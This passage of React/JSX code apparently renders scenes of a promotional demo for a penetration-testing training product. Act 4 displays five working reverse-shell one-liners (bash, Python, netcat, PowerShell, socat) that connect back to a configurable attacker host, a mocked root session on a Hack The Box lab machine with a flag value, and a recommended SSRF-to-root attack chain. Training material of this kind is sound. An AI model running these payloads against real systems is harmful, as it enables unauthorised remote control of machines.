          {/* ==================================================== */}
          {currentAct === 4 && (
            <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 10, height: "100%" }}>
              {/* Left: RevShell Studio */}
              <div
                style={{
                  backgroundColor: tokens.surfaceCard,
                  borderRadius: 11,
                  border: `1px solid ${tokens.borderSubtle}`,
                  padding: 12,
                  display: "flex",
                  flexDirection: "column",
                  gap: 8,
                  boxShadow: "0 10px 30px rgba(0, 0, 0, 0.5)",
                }}
              >
                {/* Header: Title + LHOST / LPORT Badges */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                    <Terminal size={16} color={tokens.cyberAccent} />
                    <div>
                      <div style={{ fontSize: 13, fontWeight: 800, color: tokens.textPrimary }}>
                        Dynamic Reverse Shell Studio
                      </div>
                      <div style={{ fontSize: 9, color: tokens.textMuted }}>
                        Real-time IP/Port payload generation · 12+ shell environments
                      </div>
                    </div>
                  </div>

                  {/* LHOST & LPORT config pills */}
                  <div style={{ display: "flex", gap: 5 }}>
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 4,
                        backgroundColor: tokens.surfaceSunken,
                        padding: "2px 7px",
                        borderRadius: 5,
                        border: `1px solid ${tokens.cyberAccent}55`,
                      }}
                    >
                      <span style={{ fontSize: 9, color: tokens.textMuted }}>tun0:</span>
                      <span style={{ fontSize: 10, fontFamily: "monospace", color: tokens.cyberAccent, fontWeight: 700 }}>
                        {revShellHost}
                      </span>
                    </div>
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 4,
                        backgroundColor: tokens.surfaceSunken,
                        padding: "2px 7px",
                        borderRadius: 5,
                        border: `1px solid ${tokens.cyberAccent}55`,
                      }}
                    >
                      <span style={{ fontSize: 9, color: tokens.textMuted }}>PORT:</span>
                      <span style={{ fontSize: 10, fontFamily: "monospace", color: tokens.cyberAccent, fontWeight: 700 }}>
                        {revShellPort}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Shell Payloads List */}
                <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                  {[
                    {
                      name: "Bash -i Socket (TCP)",
                      cmd: `bash -i >& /dev/tcp/${revShellHost}/${revShellPort} 0>&1`,
                      active: true,
                    },
                    {
                      name: "Python3 PTY Interactive",
                      cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${revShellHost}",${revShellPort}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
                    },
                    {
                      name: "Netcat OpenBSD FIFO",
                      cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${revShellHost} ${revShellPort} >/tmp/f`,
                    },
                    {
                      name: "PowerShell TCP Client",
                      cmd: `$c=New-Object System.Net.Sockets.TCPClient("${revShellHost}",${revShellPort});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};...`,
                    },
                    {
                      name: "Socat Encrypted PTY (SSL)",
                      cmd: `socat openssl-connect:${revShellHost}:${revShellPort},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane`,
                    },
                  ].map((p, idx) => (
                    <div
                      key={idx}
                      style={{
                        backgroundColor: tokens.surfaceElevated,
                        borderRadius: 6,
                        padding: "5px 8px",
                        border: p.active ? `1px solid ${tokens.cyberAccent}` : `1px solid ${tokens.borderSubtle}`,
                        display: "flex",
                        flexDirection: "column",
                        gap: 2,
                      }}
                    >
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                        <span style={{ fontSize: 10, fontWeight: 700, color: p.active ? tokens.cyberAccent : tokens.textPrimary }}>
                          {p.name}
                        </span>
                        <div
                          id={p.active ? "btn-copy-payload" : undefined}
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: 3,
                            backgroundColor: isPayloadCopied && p.active ? tokens.cyberAccent : "rgba(255, 255, 255, 0.08)",
                            color: isPayloadCopied && p.active ? tokens.accentFg : tokens.textPrimary,
                            padding: "1px 6px",
                            borderRadius: 4,
                            fontSize: 8,
                            fontWeight: 700,
                            cursor: "pointer",
                          }}
                        >
                          {isPayloadCopied && p.active ? <Check size={8} /> : <Copy size={8} />}
                          <span>{isPayloadCopied && p.active ? "Copied" : "Copy"}</span>
                        </div>
                      </div>
                      <div
                        style={{
                          backgroundColor: tokens.surfaceSunken,
                          borderRadius: 4,
                          padding: "3px 6px",
                          fontFamily: "monospace",
                          fontSize: 9,
                          color: tokens.textSecondary,
                          overflow: "hidden",
                          textOverflow: "ellipsis",
                          whiteSpace: "nowrap",
                        }}
                      >
                        {p.cmd}
                      </div>
                    </div>
                  ))}
                </div>

                {/* Netcat Listener Output Terminal Window */}
                <div
                  style={{
                    backgroundColor: "#030712",
                    borderRadius: 7,
                    border: `1px solid ${tokens.borderSubtle}`,
                    overflow: "hidden",
                    display: "flex",
                    flexDirection: "column",
                    flex: 1,
                    minHeight: 155,
                  }}
                >
                  {/* Terminal Header Bar */}
                  <div
                    style={{
                      backgroundColor: "rgba(255, 255, 255, 0.04)",
                      padding: "4px 8px",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between",
                      borderBottom: `1px solid ${tokens.borderSubtle}`,
                      fontSize: 8,
                      fontFamily: "monospace",
                    }}
                  >
                    <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                      <div style={{ width: 6, height: 6, borderRadius: "50%", backgroundColor: "#EF4444" }} />
                      <div style={{ width: 6, height: 6, borderRadius: "50%", backgroundColor: "#F59E0B" }} />
                      <div style={{ width: 6, height: 6, borderRadius: "50%", backgroundColor: "#10B981" }} />
                      <span style={{ color: tokens.textMuted, marginLeft: 4 }}>
                        nc -lvnp {revShellPort} (tun0)
                      </span>
                    </div>
                    <span style={{ color: tokens.cyberAccent, fontWeight: 700 }}>
                      [ESTABLISHED: 10.10.11.224]
                    </span>
                  </div>

                  {/* Terminal Session Content */}
                  <div
                    style={{
                      padding: "8px 10px",
                      fontFamily: "monospace",
                      fontSize: 9.5,
                      lineHeight: 1.45,
                      display: "flex",
                      flexDirection: "column",
                      gap: 2,
                      flex: 1,
                      justifyContent: "space-between",
                    }}
                  >
                    <div style={{ color: tokens.textMuted }}>$ nc -lvnp {revShellPort}</div>
                    <div style={{ color: tokens.cyberAccent }}>listening on [any] {revShellPort} ...</div>
                    <div style={{ color: "#10B981" }}>
                      connect to [{revShellHost}] from [10.10.11.224] 49152
                    </div>
                    <div style={{ color: tokens.textSecondary }}>
                      puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
                    </div>
                    <div style={{ color: tokens.textSecondary }}>!sh</div>
                    <div style={{ color: tokens.textPrimary }}># whoami && id</div>
                    <div style={{ color: tokens.cyberAccent, fontWeight: 700 }}>
                      root (uid=0 gid=0 groups=0(root))
                    </div>
                    <div style={{ color: "#F59E0B" }}>
                      # cat /root/root.txt -&gt; 44b7f093c8a14e9b882109fd2a1e67bb [VERIFIED ✓]
                    </div>
                  </div>
                </div>
              </div>

              {/* Right: AI Recon & Scan Intel */}
              <div
                style={{
                  backgroundColor: tokens.surfaceCard,
                  borderRadius: 11,
                  border: `1px solid ${tokens.borderSubtle}`,
                  padding: 12,
                  display: "flex",
                  flexDirection: "column",
                  gap: 6,
                  boxShadow: "0 10px 30px rgba(0, 0, 0, 0.5)",
                }}
              >
                {/* Header */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                    <Sparkles size={16} color={tokens.cyberAccent} />
                    <div>
                      <div style={{ fontSize: 13, fontWeight: 800, color: tokens.textPrimary }}>
                        AI Recon & Scan Intel
                      </div>
                      <div style={{ fontSize: 9, color: tokens.textMuted }}>
                        Client-side Nmap triaging · 0-Egress architecture
                      </div>
                    </div>
                  </div>
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      backgroundColor: tokens.cyberAccentBg,
                      border: `1px solid ${tokens.cyberAccent}55`,
                      padding: "2px 6px",
                      borderRadius: 4,
                      fontSize: 8,
                      fontWeight: 700,
                      color: tokens.cyberAccent,
                    }}
                  >
                    <Lock size={8} />
                    <span>0-EGRESS GUARANTEED</span>
                  </div>
                </div>

                {/* Scan Target Strip */}
                <div
                  style={{
                    backgroundColor: tokens.surfaceSunken,
                    borderRadius: 5,
                    padding: "4px 7px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    fontSize: 9,
                    fontFamily: "monospace",
                    border: `1px solid ${tokens.borderSubtle}`,
                  }}
                >
                  <span style={{ color: tokens.textSecondary }}>Target: 10.10.11.224 (sau.htb)</span>
                  <span style={{ color: tokens.cyberAccent }}>SYN Stealth Scan (-sC -sV -p-)</span>
                </div>

                {/* Scanned Services Breakdown */}
                <div style={{ display: "flex", flexDirection: "column", gap: 5, flex: 1, justifyContent: "space-between" }}>
                  {[
                    { port: "55555/tcp", service: "Maltrail v0.54 (Python 3.8)", vuln: "CRITICAL: Authenticated / SSRF RCE", cvss: "9.8" },
                    { port: "80/tcp", service: "nginx 1.18.0 (Ubuntu)", vuln: "Reverse proxy to localhost:8080", cvss: "5.3" },
                    { port: "22/tcp", service: "OpenSSH 8.2p1 Ubuntu", vuln: "Public key authentication enforced", cvss: "—" },
                    { port: "8080/tcp", service: "Internal Maltrail Backend API", vuln: "Accessible via SSRF on /login", cvss: "8.1" },
                    { port: "1337/tcp", service: "Node.js Health Daemon", vuln: "Internal metrics telemetry", cvss: "4.2" },
                  ].map((s, idx) => (
                    <div
                      key={idx}
                      style={{
                        backgroundColor: tokens.surfaceElevated,
                        borderRadius: 6,
                        padding: "5px 7px",
                        border: idx === 0 ? "1px solid rgba(239, 68, 68, 0.45)" : `1px solid ${tokens.borderSubtle}`,
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                      }}
                    >
                      <div>
                        <div style={{ fontSize: 10, fontWeight: 700, color: tokens.textPrimary }}>
                          {s.port} · {s.service}
                        </div>
                        <div style={{ fontSize: 8, color: idx === 0 ? "#EF4444" : tokens.textMuted, marginTop: 1 }}>
                          {s.vuln}
                        </div>
                      </div>
                      <span
                        style={{
                          fontSize: 8,
                          fontWeight: 800,
                          color: idx === 0 ? "#EF4444" : tokens.textMuted,
                          backgroundColor: idx === 0 ? "rgba(239, 68, 68, 0.15)" : "transparent",
                          padding: "1px 4px",
                          borderRadius: 3,
                        }}
                      >
                        CVSS {s.cvss}
                      </span>
                    </div>
                  ))}
                </div>

                {/* MITRE ATT&CK Mapping Pills */}
                <div style={{ display: "flex", gap: 4, flexWrap: "wrap" }}>
                  {[
                    "T1190 Exploit Public App",
                    "T1059 Command Shell",
                    "T1548 Sudo Rights",
                    "T1552 Credentials",
                  ].map((ttp, idx) => (
                    <span
                      key={idx}
                      style={{
                        fontSize: 8,
                        backgroundColor: "rgba(255, 255, 255, 0.05)",
                        color: tokens.textSecondary,
                        padding: "1px 5px",
                        borderRadius: 3,
                        fontFamily: "monospace",
                        border: `1px solid ${tokens.borderSubtle}`,
                      }}
                    >
                      #{ttp}
                    </span>
                  ))}
                </div>

                {/* AI Strategic Recommendation Box */}
                <div
                  style={{
                    backgroundColor: tokens.cyberAccentBg,
                    border: `1px solid ${tokens.cyberAccent}55`,
                    borderRadius: 6,
                    padding: "7px 9px",
                  }}
                >
                  <div style={{ fontSize: 9, fontWeight: 800, color: tokens.cyberAccent, display: "flex", alignItems: "center", gap: 4 }}>
                    <CheckCircle2 size={10} />
                    <span>RECOMMENDED ATTACK CHAIN (98% CONFIDENCE)</span>
                  </div>
                  <div style={{ fontSize: 9, color: tokens.textPrimary, marginTop: 2, lineHeight: 1.35 }}>
                    1. Abuse SSRF via Maltrail login to reach 127.0.0.1:8080 · 2. Inject command payload to obtain shell as puma · 3. Break out via sudo systemctl status pager (!sh) to root.
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ==================================================== */}
          {/* ACT 5: Authentic 24h Exam HUD & Attack Graph Captures from Actual Project */}
          {/* ==================================================== */}
          {currentAct === 5 && (
            <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 10, height: "100%" }}>
              {/* Left: Authentic OffSec OSCP (PEN-200) Exam HUD (exam-2226.webp) */}
              <div
                style={{
                  backgroundColor: tokens.surfaceCard,
                  borderRadius: 11,
                  border: `1.5px solid ${tokens.borderAccent}`,
                  overflow: "hidden",
                  boxShadow: `0 0 30px ${tokens.cyberAccentGlow}`,
                  display: "flex",
                  flexDirection: "column",
                  position: "relative",
                }}
              >
                <Img
                  src={staticFile("images/landing/exam-2226.webp")}
                  style={{
                    width: "100%",
                    height: "100%",
                    objectFit: "cover",
                    objectPosition: "top center",
                    filter: "contrast(1.05) brightness(1.02)",
                  }}
                />

                {/* Live Active Countdown Badge Overlay */}
                <div
                  style={{
                    position: "absolute",
                    top: "13%",
                    right: "12%",
                    backgroundColor: tokens.surfaceBase,
                    border: `1.5px solid ${tokens.cyberAccent}`,
                    borderRadius: 8,
                    padding: "4px 10px",
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                    boxShadow: `0 0 16px ${tokens.cyberAccentGlow}`,
                  }}
                >
                  <Clock size={12} color={tokens.cyberAccent} />
                  <span style={{ fontSize: 13, fontFamily: "monospace", fontWeight: 800, color: tokens.cyberAccent }}>
                    {examHoursLeft.toString().padStart(2, "0")}:{examMinsLeft.toString().padStart(2, "0")}:18
                  </span>
                </div>

                {/* Dynamic Passing Score Callout */}
                <div
                  style={{
                    position: "absolute",
                    bottom: 12,
                    left: 12,
                    right: 12,
                    backgroundColor: "rgba(10, 14, 20, 0.95)",
                    border: `1px solid ${tokens.borderSubtle}`,
                    borderRadius: 7,
                    padding: "6px 10px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    fontSize: 10,
                    fontFamily: "monospace",
                  }}
                >
                  <span style={{ color: tokens.textSecondary }}>OffSec PEN-200 Protocol: Alex Morgan</span>
                  <span style={{ color: tokens.cyberAccent, fontWeight: 700 }}>85/100 PTS · PASSING CRITERIA MET</span>
                </div>
              </div>

              {/* Right: Live Dynamic AD Pivoting Attack Graph */}
              <div style={{ height: "100%", overflow: "hidden" }}>
                <AttackGraphTopology progress={actProgress} themePreset={themePreset} height="100%" />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
